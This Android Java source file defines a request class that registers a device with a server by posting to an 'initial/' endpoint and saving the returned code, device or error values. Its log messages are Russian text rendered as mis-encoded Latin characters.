package com.inet.android.request;

import org.json.JSONException;
import org.json.JSONObject;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.os.AsyncTask;
import android.preference.PreferenceManager;

import com.inet.android.bs.Caller;
import com.inet.android.bs.MainActivity;
import com.inet.android.bs.Request4;
import com.inet.android.utils.Logging;

/**
 * Start request class
 * @author johny homicide
 *
 */
public class StartRequest extends DefaultRequest {
	private final String LOG_TAG = "StartRequest";
	Context ctx;

	public StartRequest(Context ctx) {
		super(ctx);
		this.ctx = ctx;
	}

	@Override
	public void sendRequest(String str) {
		RequestTask srt = new RequestTask();
		srt.execute(str);
	}

	class RequestTask extends AsyncTask<String, Void, Void> {
		@Override
		protected Void doInBackground(String... strs) {
			sendPostRequest(strs[0]);
			return null;
		}	
	}

	@Override
	protected void sendPostRequest(String postRequest) {
		String str = Caller.doMake(postRequest, "initial/");
		if (str != null) {
			getRequestData(str);
		} else {
			Logging.doLog(LOG_TAG, "îòâåòà îò ñåðâåðà íåò èëè ñòàòóñ îòâåòà ïëîõ", 
					"îòâåòà îò ñåðâåðà íåò èëè ñòàòóñ îòâåòà ïëîõ");
		}
	}

	@Override
	protected void getRequestData(String string) {
		Logging.doLog(LOG_TAG, "getResponseData: " + string, "getResponseData: " + string);

		SharedPreferences sp = PreferenceManager
				.getDefaultSharedPreferences(ctx);
		Editor ed = sp.edit();

		JSONObject jsonObject = null;
		try {
			jsonObject = new JSONObject(string);
		} catch (JSONException e) {
			if (string == null) {
				Logging.doLog(LOG_TAG, "json null", "json null");
			}
			return;
		}

		String str = null;
		try {
			str = jsonObject.getString("code");
		} catch (JSONException e) {
			e.printStackTrace();
		}
		if (str != null) {
			ed.putString("code", str);
		} else {
			ed.putString("code", "code");
		}

		if (str.equals("1")) {
			try {
				str = jsonObject.getString("device");
			} catch (JSONException e) {
				e.printStackTrace();
			}
			if (str != null) {
				ed.putString("device", str);
			} else {
				ed.putString("device", "device");
			}	
		}

		if (str.equals("0")) {
			try {
				str = jsonObject.getString("error");
			} catch (JSONException e) {
				str = null;
			}
			if (str != null) {
				ed.putString("error", str);
			} else {
				ed.putString("error", "error");
			}
			if (str.equals("0")) 
				Logging.doLog(LOG_TAG, "account íå íàéäåí", "account íå íàéäåí");
			if (str.equals("1"))
				Logging.doLog(LOG_TAG, "imei îòñóòñòâóåò èëè èìååò íåâåðíûé ôîðìàò", 
						"imei îòñóòñòâóåò èëè èìååò íåâåðíûé ôîðìàò");
			if (str.equals("2")) 
				Logging.doLog(LOG_TAG, "óñòðîéñòâî ñ óêàçàííûì imei óæå åñòü", 
						"óñòðîéñòâî ñ óêàçàííûì imei óæå åñòü");
		}

		ed.commit();
	}
}